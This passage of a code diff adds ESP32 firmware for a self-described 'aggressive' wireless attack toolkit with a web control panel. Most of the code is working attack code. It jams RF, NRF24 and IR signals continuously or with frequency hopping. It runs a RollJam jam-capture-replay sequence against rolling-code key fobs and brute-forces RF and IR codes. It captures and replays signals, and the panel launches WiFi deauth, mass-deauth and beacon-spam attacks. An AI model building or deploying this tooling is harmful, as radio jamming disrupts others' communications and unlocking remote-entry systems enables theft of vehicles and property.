+        radio.openWritingPipe(nrfState.fuzz_addr); 
+        uint8_t payload[16]; 
+        for(int i=0; i<16; i++) payload[i] = esp_random() % 256; 
+        radio.write(&payload, sizeof(payload)); 
+        nrfState.fuzz_addr[4]++; 
+        nrfState.packetsSentCount++;
+      } 
+      break;
+    case NRF_JAMMING:{
+      radio.stopListening();
+      radio.setChannel(random(0,125));
+      byte g[32];
+      for(int i=0;i<32;i++)g[i]=random(0,255);
+      radio.write(&g,sizeof(g));
+      nrfState.packetsSentCount++;
+    }break;
+    case NRF_CONT_JAM:
+      nrfContinuousJamming();
+      break;
+    case NRF_CHANNEL_HOP_JAM:
+      nrfChannelHopJamming();
+      break;
+    case NRF_AUTO_EXPLOIT:
+      nrfAutoExploit();
+      break;
+    case NRF_PACKET_ANALYZER:
+      handleNRFPacketAnalyzer();
+      break;
+  }
+}
+// CONTINUOUS RF JAMMING - NEW ENHANCED FUNCTION
+void rfContinuousJamming() {
+  if(!cc1101Connected) return;
+  
+  switchToHSPI();
+  ELECHOUSE_cc1101.SetTx();
+  
+  // Send continuous jam patterns
+  ELECHOUSE_cc1101.SendData(rfState.jam_patterns[rfState.jam_pattern_index], 32);
+  rfState.packetsSentCount++;
+  
+  // Change pattern periodically for more effective jamming
+  static unsigned long lastPatternChange = 0;
+  if(millis() - lastPatternChange > 50) {
+    rfState.jam_pattern_index = (rfState.jam_pattern_index + 1) % 12;
+    lastPatternChange = millis();
+  }
+  
+  ELECHOUSE_cc1101.SetRx();
+  switchToVSPI();
+}
+
+// PATTERN JAMMING - NEW ENHANCED FUNCTION
+void rfPatternJamming() {
+  if(!cc1101Connected) return;
+  
+  switchToHSPI();
+  ELECHOUSE_cc1101.SetTx();
+  
+  // Cycle through specific patterns designed to disrupt common RF protocols
+  for(int i = 0; i < 6; i++) {  // Use first 6 patterns for common protocols
+    ELECHOUSE_cc1101.SendData(rfState.jam_patterns[i], 32);
+    rfState.packetsSentCount++;
+    delayMicroseconds(200);
+  }
+  
+  ELECHOUSE_cc1101.SetRx();
+  switchToVSPI();
+}
+
+// FREQUENCY HOP JAMMING - NEW ENHANCED FUNCTION
+void rfFrequencyHopJamming() {
+  if(!cc1101Connected) return;
+  
+  switchToHSPI();
+  
+  // Hop between frequencies
+  static int freq_index = 0;
+  ELECHOUSE_cc1101.setMHZ(rfState.frequencies[freq_index]);
+  
+  ELECHOUSE_cc1101.SetTx();
+  ELECHOUSE_cc1101.SendData(rfState.jam_patterns[0], 32);
+  rfState.packetsSentCount++;
+  ELECHOUSE_cc1101.SetRx();
+  
+  // Move to next frequency
+  freq_index = (freq_index + 1) % 4;  // Only use first 4 frequencies (315, 433, 868, 915)
+  
+  switchToVSPI();
+}
+
+void handleRFAutoReplay() {
+  if(!cc1101Connected) return;
+  
+  switchToHSPI();
+  
+  if(ELECHOUSE_cc1101.CheckReceiveFlag() && rfState.captureCount < CAPTURE_MAX){
+    rfState.captures[rfState.captureCount].length = ELECHOUSE_cc1101.ReceiveData(rfState.captures[rfState.captureCount].data);
+    if(rfState.captures[rfState.captureCount].length > 0) {
+      rfState.captures[rfState.captureCount].rssi = ELECHOUSE_cc1101.getRssi();
+      rfState.captures[rfState.captureCount].timestamp = String(millis());
+      rfState.captureCount++;
+      rfState.last_capture_time = millis();
+      statusMessage = "Signal Captured!";
+      statusMessageTime = millis();
+    }
+  }
+  
+  // Auto-replay captured signals
+  if(rfState.captureCount > 0 && millis() - rfState.last_replay_time > 2000) {
+    ELECHOUSE_cc1101.SetTx();
+    for(int i=0; i<rfState.captureCount; i++){
+      ELECHOUSE_cc1101.SendData(rfState.captures[i].data, rfState.captures[i].length);
+      delay(50);
+    }
+    ELECHOUSE_cc1101.SetRx();
+    rfState.packetsSentCount += rfState.captureCount;
+    rfState.last_replay_time = millis();
+    
+    statusMessage = "Auto Replay";
+    statusMessageTime = millis();
+  }
+  
+  switchToVSPI();
+}
+
+void runRFMode(){
+  if(!cc1101Connected){actionRunning=false;return;}
+  switchToHSPI();
+  switch((RFSubMode)currentSubMode){
+    case RF_SPECTRUM: 
+      for(int i=0;i<256;i+=2){
+        ELECHOUSE_cc1101.setChannel(i);
+        delayMicroseconds(200);
+        int r=ELECHOUSE_cc1101.getRssi();
+        int m=map(constrain(r,-120,-20),-120,-20,0,100);
+        rfState.signalStrength[i]=m;
+        rfState.signalStrength[i+1]=m;
+        if (m > rfState.peakStrength[i]) {
+          rfState.peakStrength[i] = m;
+          rfState.peakStrength[i+1] = m;
+        } else {
+          rfState.peakStrength[i] = max(0, rfState.peakStrength[i] - 1);
+          rfState.peakStrength[i+1] = max(0, rfState.peakStrength[i+1] - 1);
+        }
+      }
+      break;
+    case RF_PACKET_ANALYZER:
+      if(millis() - rfState.pps_timer > 1000) { 
+        rfState.pps_count = 0; 
+        rfState.pps_timer = millis();
+      }
+      if(ELECHOUSE_cc1101.CheckReceiveFlag()){
+        rfState.captures[0].length=ELECHOUSE_cc1101.ReceiveData(rfState.captures[0].data);
+        if(rfState.captures[0].length>0){
+          rfState.last_rssi=ELECHOUSE_cc1101.getRssi();
+          rfState.pps_count++;
+        }
+      }
+      break;
+    case RF_REPEATER:
+      if(ELECHOUSE_cc1101.CheckReceiveFlag()){
+        byte d[64];
+        byte len = ELECHOUSE_cc1101.ReceiveData(d);
+        if(len > 0) {
+          ELECHOUSE_cc1101.SetTx();
+          ELECHOUSE_cc1101.SendData(d, len);
+          ELECHOUSE_cc1101.SetRx();
+          packetsSentCount++;
+        }
+      }
+      break;
+    case RF_CAPTURE_REPLAY:
+      if(ELECHOUSE_cc1101.CheckReceiveFlag()&&rfState.captureCount<CAPTURE_MAX){
+        rfState.captures[rfState.captureCount].length=ELECHOUSE_cc1101.ReceiveData(rfState.captures[rfState.captureCount].data);
+        if(rfState.captures[rfState.captureCount].length>0){
+          rfState.captures[rfState.captureCount].rssi = ELECHOUSE_cc1101.getRssi();
+          rfState.captures[rfState.captureCount].timestamp = String(millis());
+          rfState.captureCount++;
+        }
+      }else if(rfState.captureCount>0){
+        ELECHOUSE_cc1101.SetTx();
+        for(int i=0;i<rfState.captureCount;i++){
+          ELECHOUSE_cc1101.SendData(rfState.captures[i].data,rfState.captures[i].length);
+          delay(50);
+        }
+        ELECHOUSE_cc1101.SetRx();
+        rfState.packetsSentCount+=rfState.captureCount;
+        delay(1000);
+      }
+      break;
+    case RF_ROLL_JAM:
+      if(rfState.rolljam_state == RJ_START) rfState.rolljam_state = RJ_JAM_1;
+      else if(rfState.rolljam_state == RJ_JAM_1) { 
+        ELECHOUSE_cc1101.SetTx(); 
+        byte n[16]; 
+        for(int i=0;i<16;i++)n[i]=random(0,255); 
+        ELECHOUSE_cc1101.SendData(n,sizeof(n)); 
+        ELECHOUSE_cc1101.SetRx();
+        rfState.rolljam_state = RJ_LISTEN_1; 
+      }
+      else if(rfState.rolljam_state == RJ_LISTEN_1) { 
+        if(ELECHOUSE_cc1101.CheckReceiveFlag()){
+          rfState.captures[0].length=ELECHOUSE_cc1101.ReceiveData(rfState.captures[0].data);
+          if(rfState.captures[0].length>0){
+            rfState.captures[0].rssi = ELECHOUSE_cc1101.getRssi();
+            rfState.captures[0].timestamp = String(millis());
+            rfState.rolljam_state=RJ_CAPTURED_1;
+          }
+        } 
+      }
+      else if(rfState.rolljam_state == RJ_CAPTURED_1) { rfState.rolljam_state = RJ_JAM_2;
+      }
+      else if(rfState.rolljam_state == RJ_JAM_2) { 
+        ELECHOUSE_cc1101.SetTx();
+        byte n[16]; 
+        for(int i=0;i<16;i++)n[i]=random(0,255); 
+        ELECHOUSE_cc1101.SendData(n,sizeof(n)); 
+        ELECHOUSE_cc1101.SetRx(); 
+        rfState.rolljam_state = RJ_LISTEN_2; 
+      }
+      else if(rfState.rolljam_state == RJ_LISTEN_2) { 
+        if(ELECHOUSE_cc1101.CheckReceiveFlag()){
+          rfState.captures[1].length=ELECHOUSE_cc1101.ReceiveData(rfState.captures[1].data);
+          if(rfState.captures[1].length>0){
+            rfState.captures[1].rssi = ELECHOUSE_cc1101.getRssi();
+            rfState.captures[1].timestamp = String(millis());
+            rfState.rolljam_state=RJ_CAPTURED_2;
+          }
+        } 
+      }
+      else if(rfState.rolljam_state == RJ_CAPTURED_2) { rfState.rolljam_state = RJ_REPLAY_1;
+      }
+      else if(rfState.rolljam_state == RJ_REPLAY_1) { 
+        ELECHOUSE_cc1101.SetTx();
+        ELECHOUSE_cc1101.SendData(rfState.captures[0].data, rfState.captures[0].length); 
+        ELECHOUSE_cc1101.SetRx(); 
+        rfState.packetsSentCount++; 
+        rfState.rolljam_state = RJ_SUCCESS; 
+      }
+      break;
+    case RF_BRUTE_FORCE:{
+      ELECHOUSE_cc1101.SetTx();
+      uint8_t p[3];
+      p[0]=(rfState.bruteForceCode>>16)&0xFF;
+      p[1]=(rfState.bruteForceCode>>8)&0xFF;
+      p[2]=rfState.bruteForceCode&0xFF;
+      ELECHOUSE_cc1101.SendData(p,sizeof(p));
+      ELECHOUSE_cc1101.SetRx();
+      rfState.packetsSentCount++;
+      rfState.bruteForceCode++;
+      if(rfState.bruteForceCode>0xFFFFFF)rfState.bruteForceCode=0;
+    }break;
+    case RF_RAW_TRANSMIT:{
+      ELECHOUSE_cc1101.SetTx();
+      uint8_t p[]={0xAA,0xAA,0xAA,0xAA,0x2D,0xD4};
+      ELECHOUSE_cc1101.SendData(p,sizeof(p));
+      ELECHOUSE_cc1101.SetRx();
+      rfState.packetsSentCount++;
+      delay(200);
+    }break;
+    case RF_JAMMING:{
+      advancedJamming();
+    }break;
+    case RF_CONT_JAM:
+      rfContinuousJamming();
+      break;
+    case RF_PATTERN_JAM:
+      rfPatternJamming();
+      break;
+    case RF_FREQ_HOP_JAM:
+      rfFrequencyHopJamming();
+      break;
+    case RF_AUTO_REPLAY:
+      handleRFAutoReplay();
+      break;
+  }
+  switchToVSPI();
+}
+String getProtocolString(decode_type_t protocol) {
+  switch (protocol) {
+    case NEC: return "NEC";
+    case SONY: return "Sony";
+    case RC5: return "RC5";
+    case RC6: return "RC6";
+    case PANASONIC: return "Panasonic";
+    case LG: return "LG";
+    case SAMSUNG: return "Samsung";
+    case JVC: return "JVC";
+    case DENON: return "Denon";
+    case SHARP: return "Sharp";
+    case RCMM: return "RCMM";
+    case DISH: return "Dish";
+    case MITSUBISHI: return "Mitsubishi";
+    case UNKNOWN:
+    default: return "Unknown";
+  }
+}
+
+void handleIRLearnMacro() {
+  if(irrecv.decode(&ir_results)){
+    if(irState.macro_count < 20) {
+      irState.macro_codes[irState.macro_count] = ir_results.value;
+      char macro_name[10];
+      sprintf(macro_name, "MACRO_%d", irState.macro_count);
+      irState.macro_names[irState.macro_count] = String(macro_name);
+      irState.macro_count++;
+      statusMessage = "Macro Learned";
+      statusMessageTime = millis();
+    }
+    irrecv.resume();
+  }
+}
+
+// CONTINUOUS IR JAMMING - NEW ENHANCED FUNCTION
+void irContinuousJamming() {
+  // Send continuous IR jamming signals
+  uint16_t jam_signal[2] = {500, 500}; // Simple on-off pattern
+  irsend.sendRaw(jam_signal, 2, 38); // 38kHz carrier frequency
+  packetsSentCount++;
+}
+
+// FREQUENCY HOP IR JAMMING - NEW ENHANCED FUNCTION
+void irFrequencyHop() {
+  // Hop between different IR frequencies
+  static int freq_index = 0;
+  const int frequencies[] = {38, 40, 36, 56}; // Common IR carrier frequencies
+  
+  uint16_t jam_signal[2] = {500, 500};
+  irsend.sendRaw(jam_signal, 2, frequencies[freq_index]);
+  packetsSentCount++;
+  
+  // Change frequency
+  freq_index = (freq_index + 1) % (sizeof(frequencies)/sizeof(frequencies[0]));
+}
+
+// MACRO ATTACK - NEW ENHANCED FUNCTION
+void irMacroAttack() {
+  if(irState.macro_count == 0) return;
+  
+  static int macro_index = 0;
+  
+  // Send macro command
+  irsend.sendNEC(irState.macro_codes[macro_index]);
+  packetsSentCount++;
+  
+  // Move to next macro
+  macro_index = (macro_index + 1) % irState.macro_count;
+  delay(1000);
+}
+
+void runIRMode(){
+  switch((IRSubMode)currentSubMode){
+    case IR_SNIFF_DECODE:
+      if(irrecv.decode(&ir_results)){
+        irState.last_code=ir_results.value;
+        irState.last_protocol=getProtocolString(ir_results.decode_type);
+        irState.last_address=ir_results.address;
+        irState.last_command=ir_results.command;
+        irState.last_ir_time = millis();
+        irrecv.resume();
+      }
+      break;
+    case IR_UNIVERSAL_REMOTE:{
+      const uint32_t codes[]={0x20DF10EF,0x20DFD02F,0x20DF8877}; // Power, Volume+, Volume-
+      irsend.sendNEC(codes[irState.universal_target_index]);
+      irState.universal_target_index=(irState.universal_target_index+1)%3;
+      packetsSentCount++;
+      delay(500);
+    }break;
+    case IR_BRUTE_FORCE:{
+      irsend.sendNEC(0x20DF0000|(esp_random()%0xFFFF));
+      packetsSentCount++;
+      delay(50);
+    }break;
+    case IR_CLONE_REPLAY: 
+      if(irState.cloned_signal_len == 0) { 
+        if(irrecv.decode(&ir_results)) { 
+          irState.cloned_signal_len = ir_results.rawlen;
+          if (irState.cloned_signal_len > 0 && irState.cloned_signal_len < 512) { 
+            for(int i=0; i<irState.cloned_signal_len; i++) { 
+              irState.cloned_signal_raw[i] = ir_results.rawbuf[i] * kRawTick;
+            } 
+          } 
+          irrecv.resume();
+        } 
+      } else { 
+        irsend.sendRaw(irState.cloned_signal_raw, irState.cloned_signal_len, 38);
+        packetsSentCount++; 
+        delay(2000); 
+      } 
+      break;
+    case IR_JAM_CLONE:
+      if (irState.jam_clone_state == STATE_JAMMING) { 
+        uint16_t jam_data[2] = {500, 500};
+        irsend.sendRaw(jam_data, 2, 38); 
+        irState.jam_clone_state = STATE_LISTENING; 
+        irState.jam_time_start = millis(); 
+      }
+      else if (irState.jam_clone_state == STATE_LISTENING) { 
+        if (irrecv.decode(&ir_results)) { 
+          irState.cloned_signal_len = ir_results.rawlen;
+          if (irState.cloned_signal_len > 0 && irState.cloned_signal_len < 512) { 
+            for(int i=0; i<irState.cloned_signal_len; i++) { 
+              irState.cloned_signal_raw[i] = ir_results.rawbuf[i] * kRawTick;
+            } 
+          } 
+          irrecv.resume();
+          irState.jam_clone_state = STATE_CAPTURED; 
+        } 
+        if (millis() - irState.jam_time_start > 2000) { 
+          irState.jam_clone_state = STATE_JAMMING;
+        } 
+      }
+      else if (irState.jam_clone_state == STATE_CAPTURED) { 
+        irState.jam_clone_state = STATE_REPLAYING;
+      }
+      else if (irState.jam_clone_state == STATE_REPLAYING) { 
+        irsend.sendRaw(irState.cloned_signal_raw, irState.cloned_signal_len, 38);
+        packetsSentCount++; 
+        delay(1000); 
+        irState.jam_clone_state = STATE_JAMMING; 
+      }
+      break;
+    case IR_SCRAMBLE: 
+      irsend.sendSAMSUNG(esp_random()); 
+      packetsSentCount++; 
+      delay(20); 
+      break;
+    case IR_LEARN_MACRO:
+      handleIRLearnMacro();
+      break;
+    case IR_CONT_JAM:
+      irContinuousJamming();
+      break;
+    case IR_FREQ_HOP:
+      irFrequencyHop();
+      break;
+    case IR_MACRO_ATTACK:
+      irMacroAttack();
+      break;
+  }
+}
+void runStorageMode(){
+  if(!spiffs_mounted) { actionRunning = false; return; }
+  switch((StorageSubMode)currentSubMode) {
+    case STORAGE_LIST_FILES:
+      if(file_count == 0 && actionRunning) {
+        File root = SPIFFS.open("/");
+        File file = root.openNextFile();
+        file_count = 0;
+        while(file && file_count < 50){
+          file_list[file_count] = String(file.name());
+          file_count++;
+          file = root.openNextFile();
+        }
+        actionRunning = false;
+      }
+      break;
+    case STORAGE_TRANSFER_DATA:
+      {
+        File root = SPIFFS.open("/");
+        File file = root.openNextFile();
+        while(file){
+          Serial.printf("\n--- START FILE: %s ---\n", file.name());
+          while(file.available()){
+            Serial.write(file.read());
+          }
+          Serial.printf("\n--- END FILE: %s ---\n", file.name());
+          file = root.openNextFile();
+        }
+        Serial.println("\n--- TRANSFER COMPLETE ---");
+        statusMessage = "Transfer OK";
+        statusMessageTime = millis();
+        actionRunning = false;
+      }
+      break;
+    case STORAGE_SAVE_WIFI:
+      if(wifiDeviceCount > 0) {
+        File file = SPIFFS.open("/wifi_scan.txt", FILE_WRITE);
+        file.printf("WiFi Scan Results - %lu\n", millis());
+        file.printf("================================\n");
+        for(int i=0; i<wifiDeviceCount; i++) {
+          file.printf("SSID: %s\n", wifiList[i].ssid.c_str());
+          file.printf("RSSI: %d dBm\n", wifiList[i].rssi);
+          file.printf("BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", 
+                     wifiList[i].bssid[0], wifiList[i].bssid[1], wifiList[i].bssid[2],
+                     wifiList[i].bssid[3], wifiList[i].bssid[4], wifiList[i].bssid[5]);
+          file.printf("Channel: %d\n", wifiList[i].channel);
+          file.printf("Encryption: %s\n", wifiList[i].encryption.c_str());
+          file.printf("--------------------------------\n");
+        }
+        file.close();
+        statusMessage = "WiFi Saved";
+        statusMessageTime = millis();
+        actionRunning = false;
+      }
+      break;
+    case STORAGE_SAVE_IR:
+      if(irState.cloned_signal_len > 0) {
+        char filename[30];
+        sprintf(filename, "/ir_capture_%lu.txt", millis());
+        File file = SPIFFS.open(filename, FILE_WRITE);
+        file.print("IR Capture - ");
+        file.println(millis());
+        file.println("================");
+        file.print("Protocol: ");
+        file.println(irState.last_protocol);
+        file.print("Code: 0x");
+        file.println(irState.last_code, HEX);
+        file.print("Address: 0x");
+        file.println(irState.last_address, HEX);
+        file.print("Command: 0x");
+        file.println(irState.last_command, HEX);
+        file.print("Raw Length: ");
+        file.println(irState.cloned_signal_len);
+        file.print("Raw Data: ");
+        for(int i=0; i<irState.cloned_signal_len; i++) {
+          file.printf("%d", irState.cloned_signal_raw[i]);
+          if(i < irState.cloned_signal_len-1) file.print(",");
+        }
+        file.println();
+        file.close();
+        statusMessage = "IR Saved";
+        statusMessageTime = millis();
+        actionRunning = false;
+      }
+      break;
+    case STORAGE_FORMAT:
+      SPIFFS.format();
+      statusMessage = "Format OK";
+      statusMessageTime = millis();
+      actionRunning = false;
+      break;
+    case STORAGE_UPLOAD_FIRMWARE:
+      // Handled via web interface
+      actionRunning = false;
+      break;
+    case STORAGE_WEB_TRANSFER:
+      if (!actionRunning) {
+        startDataTransfer();
+      } else {
+        continueDataTransfer();
+      }
+      break;
+    case STORAGE_DATA_EXPORT:
+      handleDataExport();
+      actionRunning = false;
+      break;
+    case STORAGE_BACKUP:
+      createBackup();
+      actionRunning = false;
+      break;
+  }
+}
+
+void startDataTransfer() {
+  dataTransferActive = true;
+  transferStartTime = millis();
+  currentTransferFile = "";
+  
+  statusMessage = "Data Transfer Started";
+  statusMessageTime = millis();
+}
+
+void continueDataTransfer() {
+  if (!dataTransferActive) return;
+  
+  // Find next file to transfer
+  if (currentTransferFile == "") {
+    File root = SPIFFS.open("/");
+    File file = root.openNextFile();
+    
+    while (file) {
+      if (!file.isDirectory() && 
+    strncmp(file.name(), "/logs/", 6) != 0 && 
+    strncmp(file.name(), "/system/", 8) != 0) {
+        currentTransferFile = file.name();
+        break;
+      }
+      file = root.openNextFile();
+    }
+    
+    if (currentTransferFile == "") {
+      // No more files to transfer
+      dataTransferActive = false;
+      statusMessage = "Transfer Complete";
+      statusMessageTime = millis();
+      return;
+    }
+  }
+  
+  // Transfer current file
+  if (SPIFFS.exists(currentTransferFile)) {
+    File file = SPIFFS.open(currentTransferFile, FILE_READ);
+    
+    // Read and send data (simplified - in real implementation, 
+    // you'd send this over network or store it)
+    while (file.available()) {
+      uint8_t buffer[128];
+      size_t bytesRead = file.read(buffer, sizeof(buffer));
+      // Process the data (in a real implementation, send it)
+    }
+    
+    file.close();
+    
+    // Move to next file
+    currentTransferFile = "";
+  }
+}
+
+void handleDataExport() {
+  webServer.setContentLength(CONTENT_LENGTH_UNKNOWN);
+  webServer.sendHeader("Content-Type", "application/zip");
+  webServer.sendHeader("Content-Disposition", "attachment; filename=chongketzey_export.zip");
+  
+  // Create a ZIP file structure (simplified)
+  String header = "PK\x03\x04"; // ZIP file header
+  
+  // Add WiFi data
+  String wifiData = "WiFi Scan Results\n================\n";
+  for (int i = 0; i < wifiDeviceCount; i++) {
+    wifiData += "SSID: " + wifiList[i].ssid + ", RSSI: " + String(wifiList[i].rssi) + "\n";
+  }
+  
+  // Add packet capture data
+  String packetData = "Packet Capture\n==============\n";
+  for (int i = 0; i < packet_history_index; i++) {
+    packetData += packet_history[i].type + " " + packet_history[i].mac_src + " -> " + 
+                 packet_history[i].mac_dst + "\n";
+  }
+  
+  // Send the data
+  webServer.sendContent(header);
+  webServer.sendContent(wifiData);
+  webServer.sendContent(packetData);
+  
+  webServer.sendContent(""); // End of content
+}
+
+void createBackup() {
+  if (!spiffs_mounted) return;
+  
+  // Create backup directory
+  if (!SPIFFS.exists("/backup")) {
+    SPIFFS.mkdir("/backup");
+  }
+  
+  // Create backup file
+  char backupFile[30];
+  sprintf(backupFile, "/backup/backup_%lu.bin", millis());
+  
+  File backup = SPIFFS.open(backupFile, FILE_WRITE);
+  File root = SPIFFS.open("/");
+  File file = root.openNextFile();
+  
+  while (file) {
+    if (!file.isDirectory()) {
+      backup.printf("FILE: %s\n", file.name());
+      backup.printf("SIZE: %d\n", file.size());
+      backup.printf("CONTENT:\n");
+      
+      while (file.available()) {
+        backup.write(file.read());
+      }
+      
+      backup.printf("\n--- END FILE ---\n");
+    }
+    file = root.openNextFile();
+  }
+  
+  backup.close();
+  statusMessage = "Backup Created";
+  statusMessageTime = millis();
+}
+
+void handleWebRequests() {
+  if(webServer.hasArg("action")) {
+    String action = webServer.arg("action");
+    
+    if(action == "scan_wifi") { 
+      currentMode = MODE_WIFI; 
+      currentSubMode = WIFI_SCAN; 
+      actionRunning = true;
+      toggleAction();
+    }
+    else if (action == "beacon_spam") { 
+      currentMode = MODE_WIFI;
+      currentSubMode = WIFI_BEACON_SPAM; 
+      actionRunning = true;
+      toggleAction(); 
+    }
+    else if (action == "deauth") { 
+      currentMode = MODE_WIFI;
+      currentSubMode = WIFI_DEAUTH; 
+      actionRunning = true;
+      toggleAction(); 
+    }
+    else if (action == "mass_deauth") { 
+      currentMode = MODE_WIFI;
+      currentSubMode = WIFI_MASS_DEAUTH; 
+      actionRunning = true;
+      toggleAction(); 
+    }
+    else if (action == "nrf_jam") { 
+      currentMode = MODE_NRF;
+      currentSubMode = NRF_JAMMING; 
+      actionRunning = true;
+      toggleAction(); 
+    }
+    else if (action == "nrf_cont_jam") { 
+      currentMode = MODE_NRF;
+      currentSubMode = NRF_CONT_JAM; 
+      actionRunning = true;
+      toggleAction(); 
+    }
+    else if (action == "rf_jam") { 
+      currentMode = MODE_RF;
+      currentSubMode = RF_JAMMING; 
+      actionRunning = true;
+      toggleAction(); 
+    }
+    else if (action == "rf_cont_jam") { 
+      currentMode = MODE_RF;
+      currentSubMode = RF_CONT_JAM; 
+      actionRunning = true;
+      toggleAction(); 
+    }
+    else if (action == "stop") { 
+      actionRunning = false;
+      stopAllActions(); 
+    }
+    else if (action == "toggle_html") { 
+      use_custom_html = !use_custom_html;
+    }
+    else if (action == "download_all") {
+      handleDataExport();
+    }
+    else if (action == "system_reboot") {
+      handleSystemReboot();
+    }
+    else if (action == "factory_reset") {
+      handleFactoryReset();
+    }
+  }
+  
+  // Serve the main control panel
+  serveControlPanel();
+}
+
+void serveControlPanel() {
+  String html = R"=====(
+  <!DOCTYPE html><html><head>
+  <title>Advanced ESP32 Control Panel</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/sortablejs@1.14.0/Sortable.min.js"></script>
+  <style>
+    :root {
+      --primary-color: #00ff00;
+      --secondary-color: #007700;
+      --background-color: #000000;
+      --card-bg: #001100;
+      --text-color: #00ff00;
+      --border-color: #00aa00;
+    }
+    
+    body { 
+      font-family: 'Courier New', monospace; 
+      background: var(--background-color); 
+      color: var(--text-color); 
+      margin: 0; 
+      padding: 20px; 
+    }
+    
+    .container { 
+      max-width: 1200px; 
+      margin: 0 auto; 
+    }
+    
+    .header { 
+      background: var(--card-bg); 
+      color: var(--primary-color); 
+      padding: 20px; 
+      text-align: center; 
+      border: 1px solid var(--border-color);
+      margin-bottom: 20px;
+    }
+    
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 20px;
+      margin-bottom: 20px;
+    }
+    
+    .card {
+      background: var(--card-bg);
+      border: 1px solid var(--border-color);
+      border-radius: 5px;
+      padding: 15px;
+    }
+    
+    .card h3 {
+      border-bottom: 1px solid var(--border-color);
+      padding-bottom: 10px;
+      margin-top: 0;
+    }
+    
+    .btn {
+      background: var(--secondary-color);
+      color: var(--text-color);
+      border: 1px solid var(--border-color);
+      padding: 10px 15px;
+      margin: 5px;
+      border-radius: 3px;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+      text-decoration: none;
+      display: inline-block;
+    }
+    
+    .btn:hover {
+      background: var(--primary-color);
+      color: #000;
+    }
+    
+    .btn-danger {
+      background: #440000;
+      color: #ff0000;
+      border-color: #ff0000;
+    }
+    
+    .btn-warning {
+      background: #444400;
+      color: #ffff00;
+      border-color: #ffff00;
+    }
+    
+    .status {
+      padding: 10px;
+      border: 1px solid var(--border-color);
+      margin: 10px 0;
+      background: #002200;
+    }
+    
+    .log {
+      height: 200px;
+      overflow-y: auto;
+      background: #000;
+      border: 1px solid var(--border-color);
+      padding: 10px;
+      font-family: monospace;
+      font-size: 12px;
+    }
+  </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="header">
+        <h1>:: ADVANCED CHONGKETZEY CONTROL PANEL ::</h1>
+        <p>Wireless Security Toolkit - Aggressive Edition</p>
+      </div>
+      
+      <div class="grid">
+        <div class="card">
+          <h3>WiFi Tools</h3>
+          <a href="?action=scan_wifi" class="btn">WiFi Scan</a>
+          <a href="?action=beacon_spam" class="btn">Beacon Spam</a>
+          <a href="?action=deauth" class="btn">Deauth Attack</a>
+          <a href="?action=mass_deauth" class="btn">Mass Deauth</a>
+        </div>
+        
+        <div class="card">
+          <h3>NRF24 Tools</h3>
+          <a href="?action=nrf_jam" class="btn">NRF24 Jam</a>
+          <a href="?action=nrf_cont_jam" class="btn">NRF24 Cont Jam</a>
+        </div>
+        
+        <div class="card">
+          <h3>RF Tools</h3>
+          <a href="?action=rf_jam" class="btn">RF Jam</a>
+          <a href="?action=rf_cont_jam" class="btn">RF Cont Jam</a>
+        </div>
+        
+        <div class="card">
+          <h3>Data Management</h3>
+          <a href="/filemanager" class="btn">File Manager</a>
+          <a href="?action=download_all" class="btn">Export All Data</a>
+          <a href="/transfer" class="btn">Web Transfer</a>
+        </div>
+        
+        <div class="card">
+          <h3>System Control</h3>
+          <a href="?action=stop" class="btn btn-danger">STOP ALL</a>
+          <a href="?action=system_reboot" class="btn btn-warning">Reboot</a>
+          <a href="?action=factory_reset" class="btn btn-danger">Factory Reset</a>
+          <a href="/settings" class="btn">Settings</a>
+        </div>
+      </div>
+      
+      <div class="card">
+        <h3>System Status</h3>
+        <div class="status">
+          <p>Uptime: <span id="uptime">0</span> seconds</p>
+          <p>Free RAM: <span id="ram">0</span> bytes</p>
+          <p>Mode: <span id="mode">Unknown</span></p>
+          <p>Action: <span id="action">Stopped</span></p>
+        </div>
+      </div>
+      
+      <div class="card">
+        <h3>Live Data Log</h3>
+        <div class="log" id="log"></div>
+      </div>
+    </div>
+    
+    <script>
+      // WebSocket connection
+      const ws = new WebSocket('ws://' + window.location.hostname + ':81/');
+      
+      ws.onmessage = function(event) {
+        const data = JSON.parse(event.data);
+        
+        // Update system status
+        if (data.uptime) document.getElementById('uptime').textContent = data.uptime;
+        if (data.ram) document.getElementById('ram').textContent = data.ram;
+        if (data.mode) document.getElementById('mode').textContent = data.mode;
+        if (data.action) document.getElementById('action').textContent = data.action;
+        
+        // Add to log
+        if (data.log) {
+          const log = document.getElementById('log');
+          log.innerHTML += data.log + '<br>';
+          log.scrollTop = log.scrollHeight;
+        }
+      };
+      
+      // Update status every second
+      setInterval(() => {
+        fetch('/status.json')
+          .then(response => response.json())
+          .then(data => {
+            document.getElementById('uptime').textContent = data.uptime;
+            document.getElementById('ram').textContent = data.ram;
+            document.getElementById('mode').textContent = data.mode;
+            document.getElementById('action').textContent = data.action;
+          });
+      }, 1000);
+    </script>
+  </body>
+  </html>)=====";
+  
+  webServer.send(200, "text/html", html);
+}
+
+void handleWebSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length) {
+  switch(type) {
+    case WStype_DISCONNECTED:
+      wsClients[num] = false;
+      break;
+    case WStype_CONNECTED:
+      wsClients[num] = true;
+      break;
+    case WStype_TEXT:
+      handleWebSocketMessage(num, payload, length);
+      break;
+    default:
+      break;
+  }
+}
+
+void handleWebSocketMessage(uint8_t num, uint8_t * payload, size_t length) {
+  String message = String((char*)payload);
+  DynamicJsonDocument doc(1024);
+  deserializeJson(doc, message);
+  
+  String command = doc["command"];
+  
+  if (command == "get_status") {
+    sendSystemStatus(num);
+  } else if (command == "start_mode") {
+    int mode = doc["mode"];
+    int subMode = doc["subMode"];
+    currentMode = (Mode)mode;
+    currentSubMode = subMode;
+    actionRunning = true;
+    toggleAction();
+  } else if (command == "stop_all") {
+    actionRunning = false;
+    stopAllActions();
+  } else if (command == "download_file") {
+    String filename = doc["filename"];
+    handleWebFileDownload(filename, num);
+  }
+}
+void sendSystemStatus(uint8_t clientNum) {
+  DynamicJsonDocument doc(512);
+  doc["uptime"] = millis() / 1000;
+  doc["ram"] = esp_get_free_heap_size();
+  doc["mode"] = currentMode;
+  doc["subMode"] = currentSubMode;
+  doc["action"] = actionRunning ? "Running" : "Stopped";
+  doc["packets"] = packetsSentCount;
+  
+  String json;
